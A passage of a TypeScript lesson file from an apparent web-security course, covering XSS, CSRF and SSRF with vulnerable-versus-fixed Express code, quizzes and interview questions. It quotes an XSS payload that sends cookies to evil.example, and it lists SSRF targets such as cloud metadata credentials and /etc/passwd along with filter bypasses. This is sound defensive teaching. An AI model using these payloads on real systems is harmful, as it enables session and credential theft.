import type { ModuleContent } from '../../../types';
import { bullets, code, dedent, diagram, flow, interviewTip, note, section, steps, table, text, warn } from '../helpers';

const content: Partial<ModuleContent> = {
  xss: {
    summary: 'Cross-Site Scripting (XSS) lets an attacker run their JavaScript in another user\'s browser on your origin; prevent it with context-aware output encoding, safe DOM APIs and a Content Security Policy.',
    topics: ['XSS', 'stored XSS', 'reflected XSS', 'DOM XSS', 'output encoding', 'Content Security Policy', 'HttpOnly', 'innerHTML'],
    sections: [
      section('introduction', undefined,
        text('If your page prints user input as HTML, that input can contain a `<script>`. The browser trusts your origin, so the attacker\'s script gets your cookies-in-scope, your DOM and your APIs.'),
      ),
      section('definition', 'Three flavours',
        table('XSS types', ['Type', 'Where the payload lives', 'Example'], [
          ['Stored (persistent)', 'Saved in your DB, served to every viewer', 'Comment body `<img src=x onerror=alert(1)>`'],
          ['Reflected', 'In the request (URL/form), echoed back immediately', '`/search?q=<script>…</script>` rendered in "Results for …"'],
          ['DOM-based', 'Never reaches the server; client JS writes it into the DOM', '`el.innerHTML = location.hash.slice(1)`'],
        ]),
      ),
      section('why', 'Why it matters for a backend',
        bullets(
          'A script on your origin can call your API **as the victim** — cookies are attached automatically.',
          'It can read tokens in `localStorage`, keylog forms, or rewrite the page (phishing on your real domain).',
          'Backends cause stored/reflected XSS when they render HTML (template engines, error pages) or return HTML with user data.',
        ),
      ),
      section('internals', 'How a stored XSS attack unfolds',
        steps(
          'Attacker posts a comment: `<img src=x onerror="fetch(\'https://evil.example/c?d=\'+document.cookie)">`.',
          'Server stores it unchanged (storing raw text is fine).',
          'Server renders the comment with an **unescaped** template (`<%- comment %>` in EJS, `{{{ }}}` in Handlebars).',
          'Victim\'s browser parses it as HTML, the image fails, `onerror` runs on your origin.',
          'Fix at step 3: encode for the HTML context so `<` becomes `&lt;` and the browser shows text, not markup.',
        ),
        flow([
          'Attacker: posts payload',
          'DB: stores raw text',
          'Server: renders without encoding',
          'Victim browser: parses as HTML',
          'Script runs on your origin',
        ], { title: 'Stored XSS', direction: 'horizontal' }),
      ),
      section('example', 'Vulnerable vs fixed',
        code({
          title: 'HTML-context encoding (pure JS)',
          runnable: true,
          code: dedent(`
            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
            const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => map[c]);

            const comment = '<img src=x onerror="alert(1)">';
            console.log('<p>' + comment + '</p>');            // ❌ raw
            console.log('<p>' + escapeHtml(comment) + '</p>'); // ✅ encoded
          `),
          expectedOutput: '<p><img src=x onerror="alert(1)"></p>\n<p>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</p>',
          explanation: [
            'The raw string is markup — a browser would create an `<img>` and run `onerror`.',
            'Encoded, every special character is an entity, so the browser displays the text literally.',
            '`&` must be replaced too, otherwise pre-encoded payloads like `&lt;` can be smuggled.',
          ],
        }),
        code({
          title: 'Express + EJS: VULNERABLE vs FIXED',
          code: dedent(`
            // views/search.ejs
            // ❌ <%- %> outputs raw HTML
            <h1>Results for <%- q %></h1>
            // ✅ <%= %> HTML-escapes
            <h1>Results for <%= q %></h1>

            // route
            app.get('/search', (req, res) => {
              res.render('search', { q: req.query.q ?? '' });
            });

            // ❌ building HTML strings in a route
            res.send('<h1>Results for ' + req.query.q + '</h1>');
            // ✅ return JSON and let the client render it as text
            res.json({ query: req.query.q, results });
          `),
          expectedOutput: "GET /search?q=<script>alert(1)</script>\n  <%- q %> → <h1>Results for <script>alert(1)</script></h1>   (script runs)\n  <%= q %> → <h1>Results for &lt;script&gt;alert(1)&lt;/script&gt;</h1>",
          explanation: [
            'Template engines escape by default with their normal tag; the "raw" tag is the bug.',
            'Concatenating HTML in a route bypasses the engine\'s escaping entirely.',
            'React/Vue escape text by default; `dangerouslySetInnerHTML`/`v-html` are the raw equivalents.',
          ],
        }),
        code({
          title: 'DOM XSS: VULNERABLE vs FIXED (browser code)',
          code: dedent(`
            // ❌ VULNERABLE
            document.querySelector('#greeting').innerHTML = 'Hi ' + new URLSearchParams(location.search).get('name');
            // ✅ FIXED — textContent never parses HTML
            document.querySelector('#greeting').textContent = 'Hi ' + new URLSearchParams(location.search).get('name');
            // If you must render user HTML (rich text), sanitise with a vetted library such as DOMPurify (third-party)
          `),
          expectedOutput: '?name=<img src=x onerror=alert(1)>\n  innerHTML   → alert(1) fires\n  textContent → shows "Hi <img src=x onerror=alert(1)>"',
          explanation: [
            'DOM XSS never touches the server, so server-side encoding cannot help — the client sink is the bug.',
            'Dangerous sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `href="javascript:…"`.',
          ],
        }),
      ),
      section('real-world', 'Defence in depth',
        bullets(
          '**Output encoding** per context (HTML body, attribute, JS string, URL) — see the Output encoding lesson.',
          '**CSP** (via Helmet or by hand): `script-src \'self\'` with nonces blocks inline and third-party scripts even if markup is injected.',
          '**HttpOnly cookies**: they do **not** prevent XSS, but they stop `document.cookie` theft of the session. The script can still make requests as the user.',
          'Validate URLs you render into `href`/`src` — allow only `http:`/`https:` schemes, never `javascript:`.',
          'Serve JSON with `Content-Type: application/json` and `X-Content-Type-Options: nosniff` so it is never rendered as HTML.',
        ),
        diagram('request-response', 'XSS rides on a normal response — the payload is in the body your server sends.'),
      ),
      section('mistakes', 'Common mistakes',
        bullets(
          'Sanitising on input ("strip `<script>`") instead of encoding on output — blacklists always miss `onerror`, `<svg onload>`, etc.',
          'Thinking HttpOnly cookies "fix" XSS.',
          'HTML-encoding a value placed inside a `<script>` block or an `onclick` attribute — wrong context.',
          'Trusting data from your own database: stored XSS comes *from* your database.',
        ),
      ),
      section('interview', 'Interview angle',
        interviewTip('Name the three types, then say: "encode on output for the context, avoid dangerous sinks, add CSP as a second layer, and HttpOnly limits cookie theft but not the attack."'),
      ),
      section('practice', 'Practice',
        text('Render a list of comments in an Express + EJS app. Insert `<svg onload=alert(1)>` as a comment. Confirm it fires with `<%-` and does not with `<%=`. Then add a CSP header `script-src \'self\'` and observe the console violation report when you revert to `<%-`.'),
      ),
      section('summary', 'Summary',
        bullets(
          'XSS = attacker JS running on your origin. Stored, reflected, DOM.',
          'Primary fix: context-aware output encoding and safe sinks (`textContent`).',
          'Secondary: CSP, sanitiser for rich HTML, URL scheme allowlist.',
          'HttpOnly limits token theft; it does not stop XSS.',
        ),
      ),
    ],
    revisionNotes: [
      'Stored = in DB; Reflected = echoed from request; DOM = client-only sink.',
      'EJS `<%= %>` escapes, `<%- %>` is raw. Handlebars `{{ }}` vs `{{{ }}}`.',
      'Encode on output, per context; do not blacklist on input.',
      'CSP `script-src` with nonces is the strongest second layer.',
      'HttpOnly blocks `document.cookie`, not the XSS itself.',
    ],
    quiz: [
      {
        kind: 'find-bug', difficulty: 'intermediate',
        prompt: 'What is the vulnerability?',
        code: "app.get('/hello', (req, res) => {\n  res.send(`<h1>Hello ${req.query.name}</h1>`);\n});",
        options: [
          'Reflected XSS — the query value is inserted into HTML without encoding',
          'SQL injection through `name`',
          'Stored XSS — the name is saved in the database',
          'CSRF — no token is checked',
        ],
        answer: 0,
        explanation: 'The value comes from the request and is echoed straight back as HTML: reflected XSS. Nothing is stored, and no state changes (so CSRF is irrelevant).',
      },
      {
        kind: 'mcq', difficulty: 'intermediate',
        prompt: 'Your session cookie is `HttpOnly`. An attacker finds stored XSS. What can the injected script still do?',
        options: [
          'Nothing — HttpOnly blocks all scripts',
          'Read the cookie with `document.cookie`',
          'Send authenticated requests to your API from the victim\'s browser',
          'Only show an alert box',
        ],
        answer: 2,
        explanation: 'HttpOnly hides the cookie from JS, but the browser still attaches it to same-origin requests the script makes. XSS is "session riding" even without stealing the token.',
      },
      {
        kind: 'mcq', difficulty: 'beginner',
        prompt: 'Which DOM API is safe for inserting untrusted text?',
        options: ['innerHTML', 'document.write', 'textContent', 'insertAdjacentHTML'],
        answer: 2,
        explanation: '`textContent` sets text and never parses HTML. The other three parse their argument as markup.',
      },
    ],
    interview: [
      {
        category: 'express-backend', kind: 'concept', difficulty: 'intermediate', topic: 'XSS',
        question: 'What is the difference between stored, reflected and DOM-based XSS, and which can server-side encoding prevent?',
        shortAnswer: 'Stored comes from your database, reflected is echoed from the request, DOM-based happens entirely in client JS; server-side encoding prevents the first two, DOM XSS needs safe client sinks.',
        detailedAnswer: [
          'Stored: saved payload rendered for every viewer — highest impact.',
          'Reflected: payload in a crafted link; victim must click it.',
          'DOM: client code reads `location`/`postMessage` and writes it to `innerHTML`/`eval`.',
          'Server encoding never sees DOM-XSS data; fix with `textContent`, sanitiser, Trusted Types, CSP.',
        ],
        followUp: 'How does a Content Security Policy mitigate XSS?',
        trap: 'Saying input sanitisation (stripping `<script>`) is the fix.',
      },
      {
        category: 'advanced', kind: 'concept', difficulty: 'advanced', topic: 'XSS',
        question: 'Why is a nonce-based Content Security Policy stronger than an allowlist of script domains?',
        shortAnswer: 'Domain allowlists often include CDNs or JSONP endpoints an attacker can abuse; a per-response random nonce means only script tags your server emitted can run.',
        detailedAnswer: [
          'Allowlisted CDNs host many libraries; old AngularJS or JSONP endpoints become CSP bypass gadgets.',
          'With `script-src \'nonce-<random>\'`, injected `<script>` tags lack the nonce and are blocked.',
          'The nonce must be cryptographically random and new for each response; cached HTML breaks it.',
          '`\'strict-dynamic\'` lets nonce-trusted scripts load their dependencies.',
          'Inline event handlers (`onclick=`) are blocked unless `\'unsafe-inline\'` — never add it.',
        ],
        followUp: 'How would you roll CSP out without breaking production?',
        trap: 'Adding `\'unsafe-inline\'` to make the app work, which disables most XSS protection.',
      },
    ],
  },

  csrf: {
    summary: 'Cross-Site Request Forgery tricks a logged-in user\'s browser into sending an authenticated, state-changing request to your site; defend with SameSite cookies plus a CSRF token or origin checks.',
    topics: ['CSRF', 'SameSite', 'synchronizer token', 'double-submit cookie', 'Origin header', 'cookie-based auth', 'csurf deprecated'],
    sections: [
      section('introduction', undefined,
        text('Browsers attach cookies to requests automatically — even when another site triggers the request. CSRF exploits that: the attacker does not read anything, they just make your browser *do* something.'),
      ),
      section('definition', 'Definition',
        text('**CSRF** is an attack where a malicious site causes the victim\'s browser to send a request to a target site where the victim is authenticated by **ambient credentials** (cookies, HTTP Basic auth, client certs).'),
        bullets(
          'It needs: cookie-based auth, a state-changing endpoint, and no unpredictable value the attacker must supply.',
          'APIs that authenticate with an `Authorization: Bearer` header the client attaches manually are **not** CSRF-able — browsers do not add that header automatically.',
        ),
      ),
      section('why', 'Why it still matters',
        bullets(
          'Session cookies are the most common auth for server-rendered apps and BFFs.',
          'Modern browsers default cookies to `SameSite=Lax` when unspecified (Chrome and Edge do; behaviour varies across browsers), which helps but is not a full defence.',
          'Lax still allows top-level `GET` navigations — any `GET` that changes state is still exploitable.',
        ),
      ),
      section('internals', 'Attack step by step',
        steps(
          'Victim logs in to `bank.example`; browser stores `sid=abc` cookie.',
          'Victim visits `evil.example`, which contains an auto-submitting form: `<form action="https://bank.example/transfer" method="POST">`.',
          'Browser sends the POST to bank.example **with `sid=abc` attached** (if SameSite allows it).',
          'Server sees a valid session and performs the transfer. The attacker never saw the response — they did not need to.',
          'Defence: the server demands something the attacker\'s page cannot know or set — a CSRF token, or a same-site/same-origin signal.',
        ),
        flow([
          'Victim: logged in to bank (cookie set)',
          'Victim: opens evil.example',
          'evil page: auto-submits form to bank',
          'Browser: attaches bank cookie',
          'Bank: valid session → transfers money',
        ], { title: 'Classic CSRF', direction: 'vertical' }),
        table('SameSite values', ['Value', 'Cross-site subresource / POST', 'Top-level GET link', 'Notes'], [
          ['Strict', 'Not sent', 'Not sent', 'Safest; user arriving from an email link appears logged out'],
          ['Lax', 'Not sent', 'Sent', 'Good default; never change state on GET'],
          ['None', 'Sent', 'Sent', 'Requires `Secure`; needed for genuine cross-site embeds'],
        ]),
      ),
      section('example', 'Vulnerable vs fixed',
        code({
          title: 'Synchronizer-token check (pure JS simulation)',
          runnable: true,
          code: dedent(`
            const sessions = new Map([['sid-1', { user: 'ana', csrf: 'r4nd0m-t0ken' }]]);

            function transfer(req) {
              const s = sessions.get(req.cookies.sid);
              if (!s) return '401 not logged in';
              if (req.body._csrf !== s.csrf) return '403 bad CSRF token';
              return '200 transferred ' + req.body.amount;
            }

            // Legit form: page was rendered with the token in a hidden field
            console.log(transfer({ cookies: { sid: 'sid-1' }, body: { amount: 50, _csrf: 'r4nd0m-t0ken' } }));
            // Attacker's form: browser attaches the cookie, but attacker cannot know the token
            console.log(transfer({ cookies: { sid: 'sid-1' }, body: { amount: 5000 } }));
          `),
          expectedOutput: '200 transferred 50\n403 bad CSRF token',
          explanation: [
            'The cookie alone proves "this browser", not "this user intended this action".',
            'The token lives in the session and is embedded in pages your origin renders; the same-origin policy stops evil.example from reading it.',
          ],
        }),
        code({
          title: 'Express: VULNERABLE vs FIXED',
          code: dedent(`
            // ❌ VULNERABLE: cookie session, state change, nothing else checked
            app.post('/transfer', requireSession, (req, res) => doTransfer(req.session.userId, req.body));
            app.get('/account/delete', requireSession, deleteAccount); // GET that changes state!

            // ✅ FIXED
            app.use(session({
              secret: process.env.SESSION_SECRET,
              cookie: { httpOnly: true, secure: true, sameSite: 'lax' },
            }));

            // 1) Origin check for unsafe methods
            const ALLOWED = new Set(['https://bank.example']);
            app.use((req, res, next) => {
              if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
              const origin = req.get('origin');
              if (!origin || !ALLOWED.has(origin)) return res.status(403).json({ error: 'Bad origin' });
              next();
            });

            // 2) Synchronizer token stored in the session
            app.use((req, res, next) => {
              req.session.csrf ??= crypto.randomBytes(32).toString('hex');
              res.locals.csrfToken = req.session.csrf; // put in forms / a meta tag
              next();
            });
            const verifyCsrf = (req, res, next) => {
              const sent = req.get('x-csrf-token') ?? req.body._csrf ?? '';
              const a = Buffer.from(sent), b = Buffer.from(req.session.csrf);
              if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return res.status(403).end();
              next();
            };
            app.post('/transfer', requireSession, verifyCsrf, handler);
            app.post('/account/delete', requireSession, verifyCsrf, deleteAccount); // POST, not GET
          `),
          expectedOutput: 'POST /transfer from evil.example (Origin: https://evil.example) → 403 {"error":"Bad origin"}\nPOST /transfer from bank page with X-CSRF-Token             → 200',
          explanation: [
            '`SameSite=Lax` already blocks the cross-site POST in modern browsers; the token covers older browsers and same-site subdomain attackers.',
            'Checking `Origin` (falling back to `Referer`) is a cheap, effective layer for unsafe methods.',
            '`crypto.timingSafeEqual` avoids leaking the token through comparison timing.',
          ],
        }),
      ),
      section('real-world', 'Choosing a defence',
        table('CSRF defences', ['Defence', 'How', 'Notes'], [
          ['SameSite cookies', '`Lax` or `Strict` on session cookie', 'Baseline; same-site (e.g. sibling subdomain) attacks still possible'],
          ['Synchronizer token', 'Random token in session, echoed in form/header', 'Stateful; strongest classic defence'],
          ['Double-submit cookie', 'Token in a cookie and in a header; server compares', 'Stateless; sign/HMAC it to the session so subdomains cannot plant one'],
          ['Origin / Fetch Metadata', 'Check `Origin` or `Sec-Fetch-Site`', 'Cheap; reject `cross-site` for unsafe methods'],
          ['Header-based auth', '`Authorization: Bearer` from JS', 'Not CSRF-able, but tokens readable by JS are exposed to XSS'],
        ]),
        warn('The old `csurf` package is **deprecated** and archived by its maintainers. Do not add it to new projects. Implement the token pattern yourself (as above) or use a currently maintained library after checking its status.'),
      ),
      section('mistakes', 'Common mistakes',
        bullets(
          'State-changing `GET` routes — Lax cookies are sent on top-level GET navigations.',
          'Using `SameSite=None` without need (and it requires `Secure`).',
          'CORS confusion: CORS controls who can **read** responses; a simple cross-site form POST is sent regardless.',
          'XSS defeats every CSRF defence — the script runs on your origin and can read the token.',
        ),
      ),
      section('interview', 'Interview angle',
        interviewTip('A crisp line: "CSRF abuses ambient credentials; XSS abuses trust in content. SameSite is the baseline, a token or Origin check is the guarantee, and bearer-token APIs are not affected."'),
      ),
      section('practice', 'Practice',
        text('Build a tiny Express app with cookie sessions and a `POST /email` that changes the user\'s email. Serve an attacker HTML page from a different port/host that auto-submits a form to it. Observe the effect of `sameSite: "none"` vs `"lax"`, then add the token check.'),
      ),
      section('summary', 'Summary',
        bullets(
          'CSRF = forged state-changing request using the victim\'s cookies.',
          'SameSite Lax/Strict blocks most cross-site cookie sending; never change state on GET.',
          'Add a synchronizer or signed double-submit token, and/or Origin/Fetch-Metadata checks.',
          '`csurf` is deprecated — do not use it.',
        ),
      ),
    ],
    revisionNotes: [
      'Needs ambient credentials (cookies). Bearer headers are not CSRF-able.',
      'SameSite: Strict (never cross-site), Lax (top-level GET only), None (+Secure).',
      'Synchronizer token = stateful; double-submit = stateless (sign it).',
      'Check `Origin` / `Sec-Fetch-Site` on unsafe methods.',
      'CORS ≠ CSRF protection. `csurf` is deprecated.',
    ],
    quiz: [
      {
        kind: 'scenario', difficulty: 'intermediate',
        prompt: 'Your SPA calls the API with `Authorization: Bearer <token>` from JavaScript and uses no cookies. A reviewer asks for CSRF tokens. What is the best response?',
        options: [
          'Add CSRF tokens to every endpoint anyway',
          'Explain CSRF needs credentials the browser attaches automatically; bearer headers are not — focus on XSS since the token is readable by JS',
          'Switch to `SameSite=None` cookies',
          'Enable CORS for all origins',
        ],
        answer: 1,
        explanation: 'A cross-site page cannot make the browser attach your bearer header, so classic CSRF does not apply. The real risk of JS-readable tokens is XSS.',
      },
      {
        kind: 'find-bug', difficulty: 'intermediate',
        prompt: 'Session cookie is `SameSite=Lax`. Why is this still CSRF-vulnerable?',
        code: "app.get('/newsletter/unsubscribe', requireSession, async (req, res) => {\n  await db.users.update(req.session.userId, { newsletter: false });\n  res.send('Unsubscribed');\n});",
        options: [
          'Lax cookies are never sent',
          'It changes state on a GET, and Lax cookies are sent on top-level cross-site GET navigations',
          'It should use `res.json`',
          'requireSession runs too late',
        ],
        answer: 1,
        explanation: 'A link or redirect from evil.example is a top-level GET, so the Lax cookie is attached. State changes belong on POST/PUT/DELETE with CSRF protection.',
      },
      {
        kind: 'mcq', difficulty: 'beginner',
        prompt: 'Which statement about CORS and CSRF is correct?',
        options: [
          'CORS fully prevents CSRF',
          'CORS controls whether a cross-origin script can read the response; a simple form POST is still sent',
          'CORS encrypts cookies',
          'Disabling CORS disables cookies',
        ],
        answer: 1,
        explanation: 'CORS is a read-permission mechanism. Simple requests (form POSTs) are sent without preflight, so the side effect happens even if the response is unreadable.',
      },
    ],
    interview: [
      {
        category: 'express-backend', kind: 'concept', difficulty: 'intermediate', topic: 'CSRF',
        question: 'How does the SameSite cookie attribute mitigate CSRF, and why is it not always sufficient on its own?',
        shortAnswer: 'SameSite stops the browser from attaching the cookie to cross-site requests (Lax allows top-level GETs); it does not cover same-site attackers, state-changing GETs or older browsers.',
        detailedAnswer: [
          '"Site" = registrable domain (eTLD+1); `a.example.com` and `b.example.com` are same-site.',
          'A compromised or user-content subdomain can therefore still forge requests.',
          'Lax permits top-level navigations with GET, so GET must be safe/idempotent.',
          'Browser support and defaults differ; a token or Origin check gives a guarantee you control.',
        ],
        followUp: 'What is the difference between same-site and same-origin?',
        trap: 'Treating "site" and "origin" as the same thing.',
      },
      {
        category: 'advanced', kind: 'concept', difficulty: 'advanced', topic: 'CSRF',
        question: 'Why should a double-submit CSRF cookie be signed or bound to the session?',
        shortAnswer: 'Because an attacker who controls a sibling subdomain (or can inject cookies) can set their own CSRF cookie and send the matching header; binding it to the session with an HMAC makes forged values fail.',
        detailedAnswer: [
          'Naive double-submit only checks cookie value === header value.',
          'Cookies can be written by any same-site subdomain (cookie tossing) or over plain HTTP if not using `__Host-` prefix.',
          'Signed variant: token = HMAC(secret, sessionId + random); server recomputes and compares.',
          'Use the `__Host-` cookie prefix (Secure, Path=/, no Domain) to prevent subdomains overwriting it.',
        ],
        followUp: 'When would you choose a synchronizer token over double-submit?',
        trap: 'Assuming attackers can never write cookies for your domain.',
      },
    ],
  },

  ssrf: {
    summary: 'Server-Side Request Forgery makes your server fetch an attacker-chosen URL — often internal services or cloud metadata at 169.254.169.254; defend with allowlists, post-resolution IP checks and network egress controls.',
    topics: ['SSRF', 'cloud metadata', '169.254.169.254', 'IMDSv2', 'allowlist', 'DNS rebinding', 'private IP ranges', 'redirects'],
    sections: [
      section('introduction', undefined,
        text('Features like "import from URL", webhooks and link previews make your server fetch URLs supplied by users. Your server sits *inside* the network — so it can reach things the attacker cannot.'),
      ),
      section('definition', 'Definition',
        text('**SSRF** (OWASP A10:2021) is when an attacker controls the destination of a server-side request, making the server act as a proxy into internal networks or to sensitive endpoints.'),
        table('Common SSRF targets', ['Target', 'Example URL', 'Impact'], [
          ['Cloud metadata', '`http://169.254.169.254/latest/meta-data/iam/security-credentials/`', 'Temporary cloud credentials → account takeover'],
          ['Localhost admin', '`http://127.0.0.1:9200/_cat/indices`', 'Unauthenticated internal services (Elasticsearch, Redis HTTP, admin panels)'],
          ['Internal network', '`http://10.0.3.7/internal-api`', 'Bypass firewalls, scan ports'],
          ['Other schemes', '`file:///etc/passwd`, `gopher://`', 'Local file read or protocol smuggling (library dependent)'],
        ]),
      ),
      section('why', 'Why it is dangerous',
        bullets(
          'Cloud instance metadata services hand out IAM credentials to anything on the host that asks.',
          'Internal services often skip auth because "only our network can reach them".',
          'Blind SSRF (no response shown) still allows port scanning and triggering internal actions.',
        ),
      ),
      section('internals', 'Attack and bypass techniques',
        steps(
          'App offers `POST /preview { url }` and runs `await fetch(url)`.',
          'Attacker sends `http://169.254.169.254/latest/meta-data/` and gets metadata back in the preview.',
          'You block the string "169.254.169.254" — attacker uses `http://2852039166/` (decimal IP), `http://[::ffff:169.254.169.254]/`, or `metadata.attacker.example` whose DNS A record is 169.254.169.254.',
          'You resolve DNS and check the IP — attacker uses **DNS rebinding**: first lookup returns a public IP (passes your check), second lookup (made by `fetch`) returns 127.0.0.1.',
          'You check the first URL — attacker\'s public server replies `302 Location: http://127.0.0.1/` and `fetch` follows redirects by default.',
          'Robust fix: resolve once, validate the **resolved IP**, connect to *that* IP, disable or re-validate redirects, and enforce network egress rules.',
        ),
        flow([
          'User URL',
          'Parse: scheme must be https',
          'Host in allowlist?',
          'DNS resolve all addresses',
          'Reject private/link-local/loopback',
          'Connect to the validated IP',
          'Redirects: off or re-check',
        ], { title: 'Safe outbound fetch', direction: 'vertical' }),
      ),
      section('example', 'Vulnerable vs fixed',
        code({
          title: 'Classifying IPv4 addresses (pure JS)',
          runnable: true,
          code: dedent(`
            function isBlockedIPv4(ip) {
              const p = ip.split('.').map(Number);
              if (p.length !== 4 || p.some((n) => !Number.isInteger(n) || n < 0 || n > 255)) return true; // fail closed
              const [a, b] = p;
              return a === 0 || a === 10 || a === 127 ||                 // this-net, private, loopback
                (a === 169 && b === 254) ||                              // link-local (cloud metadata)
                (a === 172 && b >= 16 && b <= 31) ||                     // private
                (a === 192 && b === 168) ||                              // private
                (a === 100 && b >= 64 && b <= 127) ||                    // carrier-grade NAT
                a >= 224;                                                // multicast / reserved
            }
            for (const ip of ['93.184.215.14', '169.254.169.254', '10.1.2.3', '172.20.0.5', '8.8.8.8', '999.1.1.1']) {
              console.log(ip.padEnd(16), isBlockedIPv4(ip) ? 'BLOCK' : 'allow');
            }
          `),
          expectedOutput: '93.184.215.14    allow\n169.254.169.254  BLOCK\n10.1.2.3         BLOCK\n172.20.0.5       BLOCK\n8.8.8.8          allow\n999.1.1.1        BLOCK',
          explanation: [
            'Check the **resolved** address, never the hostname string.',
            'Invalid input fails closed (blocked).',
            'Real code must also handle IPv6 (`::1`, `fc00::/7`, `fe80::/10`, IPv4-mapped `::ffff:`); Node\'s `net.BlockList` can hold these ranges.',
          ],
        }),
        code({
          title: 'Link preview: VULNERABLE vs FIXED (Node 18+)',
          code: dedent(`
            // ❌ VULNERABLE
            app.post('/preview', async (req, res) => {
              const r = await fetch(req.body.url);          // any scheme/host, follows redirects
              res.send(await r.text());                      // reflects internal responses
            });

            // ✅ FIXED
            import { lookup } from 'node:dns/promises';
            import net from 'node:net';

            const blockList = new net.BlockList();
            for (const [addr, prefix] of [['0.0.0.0', 8], ['10.0.0.0', 8], ['127.0.0.0', 8], ['169.254.0.0', 16],
                                          ['172.16.0.0', 12], ['192.168.0.0', 16], ['100.64.0.0', 10]]) {
              blockList.addSubnet(addr, prefix, 'ipv4');
            }
            blockList.addSubnet('fc00::', 7, 'ipv6');
            blockList.addSubnet('fe80::', 10, 'ipv6');
            blockList.addAddress('::1', 'ipv6');

            async function assertSafeUrl(raw) {
              const url = new URL(raw);
              if (url.protocol !== 'https:') throw new Error('https only');
              const addrs = await lookup(url.hostname, { all: true });
              for (const { address, family } of addrs) {
                if (blockList.check(address, family === 6 ? 'ipv6' : 'ipv4')) throw new Error('blocked address');
              }
              return { url, address: addrs[0].address };
            }

            app.post('/preview', async (req, res) => {
              try {
                const { url } = await assertSafeUrl(req.body.url);
                const r = await fetch(url, { redirect: 'manual', signal: AbortSignal.timeout(3000) });
                if (r.status >= 300 && r.status < 400) return res.status(422).json({ error: 'redirects not allowed' });
                const html = (await r.text()).slice(0, 100_000);
                res.json({ title: extractTitle(html) });     // return parsed data, not the raw body
              } catch {
                res.status(422).json({ error: 'URL not allowed' });
              }
            });
          `),
          expectedOutput: 'url=http://169.254.169.254/latest/meta-data/ → 422 {"error":"URL not allowed"}\nurl=https://example.com/                    → 200 {"title":"Example Domain"}',
          explanation: [
            '`lookup(..., { all: true })` checks every address a name resolves to.',
            '`redirect: "manual"` stops `fetch` silently following a 302 to an internal host.',
            'Remaining gap: `fetch` resolves DNS again (rebinding window). For full protection pin the connection to the validated IP (e.g. a custom `lookup` in an undici Agent or `http.request`) or route through an egress proxy.',
            'Timeouts and size limits stop the feature being used for slowloris-style abuse.',
          ],
          versionNote: 'Global `fetch` and `AbortSignal.timeout` are available in Node 18+. `net.BlockList` since Node 15.',
        }),
      ),
      section('real-world', 'Defence in depth',
        bullets(
          'Prefer a **domain allowlist** (e.g. only your webhook partners) over a blocklist whenever the feature allows.',
          'On AWS require **IMDSv2** (session token via PUT, hop limit 1) so a simple GET-based SSRF cannot read metadata.',
          'Run URL-fetching workers in an isolated subnet with egress rules that deny internal ranges.',
          'Never return raw upstream bodies or error messages to the user (blind SSRF is still possible, but data leakage is reduced).',
        ),
        note('Webhooks, PDF/HTML renderers (headless browsers loading `<img src="http://169.254.169.254">`), XML parsers (XXE) and image proxies are all SSRF sinks.'),
      ),
      section('mistakes', 'Common mistakes',
        bullets(
          'String-matching the hostname (`url.includes("localhost")`) — trivially bypassed with decimal, octal, IPv6 or DNS names.',
          'Validating, then letting the HTTP client re-resolve DNS (rebinding).',
          'Following redirects without re-validating each hop.',
          'Forgetting IPv6 and IPv4-mapped IPv6 addresses.',
        ),
      ),
      section('interview', 'Interview angle',
        interviewTip('Say "169.254.169.254", "allowlist", "check the resolved IP and pin it", "disable redirects", and "DNS rebinding" — that sequence shows you understand why naive fixes fail.'),
      ),
      section('practice', 'Practice',
        text('Write `safeFetch(url)` that enforces https, resolves DNS, blocks private ranges (v4 and v6) with `net.BlockList`, refuses redirects and times out after 3 s. Test it with `http://127.0.0.1`, `https://localhost`, and a public URL.'),
      ),
      section('summary', 'Summary',
        bullets(
          'SSRF = attacker chooses where your server sends requests (A10:2021).',
          'Top target: cloud metadata `169.254.169.254` → credentials.',
          'Allowlist hosts; validate resolved IPs; pin the connection; block redirects.',
          'Network egress controls and IMDSv2 limit the blast radius.',
        ),
      ),
    ],
    revisionNotes: [
      'Metadata IP: 169.254.169.254 (link-local 169.254.0.0/16).',
      'Block 10/8, 172.16/12, 192.168/16, 127/8, 0/8, 100.64/10, ::1, fc00::/7, fe80::/10.',
      'DNS rebinding: check-time IP ≠ use-time IP → pin the IP.',
      '`fetch` follows redirects by default → `redirect: "manual"`.',
      'AWS IMDSv2 requires a PUT-issued token — mitigates simple SSRF.',
    ],
    quiz: [
      {
        kind: 'find-bug', difficulty: 'advanced',
        prompt: 'What bypass does this SSRF check miss?',
        code: "const host = new URL(req.body.url).hostname;\nconst { address } = await dns.lookup(host);\nif (isPrivate(address)) throw new Error('blocked');\nconst r = await fetch(req.body.url);",
        options: [
          'None — the resolved IP is checked',
          'DNS rebinding and redirects: fetch resolves the name again and follows 3xx to internal hosts',
          'It should use `dns.resolve4` instead of lookup',
          'URL parsing throws on IPv6',
        ],
        answer: 1,
        explanation: 'The check-time lookup and the fetch-time lookup can return different IPs (rebinding), and `fetch` follows redirects by default. Pin the IP and disable redirects.',
      },
      {
        kind: 'mcq', difficulty: 'intermediate',
        prompt: 'Why is `169.254.169.254` the classic SSRF target?',
        options: [
          'It is Google DNS',
          'It is the cloud instance metadata endpoint, which can return temporary credentials',
          'It is the default Express port',
          'It is the address of every load balancer',
        ],
        answer: 1,
        explanation: 'AWS, GCP and Azure expose instance metadata (including IAM credentials on AWS) at this link-local address, reachable only from the instance itself.',
      },
    ],
    interview: [
      {
        category: 'advanced', kind: 'scenario', difficulty: 'advanced', topic: 'SSRF',
        question: 'You must build a webhook feature where customers register arbitrary callback URLs. How do you prevent SSRF?',
        shortAnswer: 'Validate scheme and port, resolve DNS and reject private/link-local/loopback addresses, pin the connection to the checked IP, disable redirects, add timeouts, and run the sender in an egress-restricted network.',
        detailedAnswer: [
          'Validate at registration **and** at send time (DNS can change).',
          'Allow only `https` and standard ports; reject userinfo (`user@host`) tricks.',
          'Check all A/AAAA records with a block list covering IPv4, IPv6 and IPv4-mapped IPv6.',
          'Connect to the validated IP (custom lookup) so rebinding cannot swap it.',
          'Dedicated worker in a subnet whose firewall denies RFC 1918 and metadata; IMDSv2 on cloud.',
        ],
        followUp: 'How does DNS rebinding defeat a check-then-fetch implementation?',
        trap: 'Relying on a hostname string blocklist.',
      },
      {
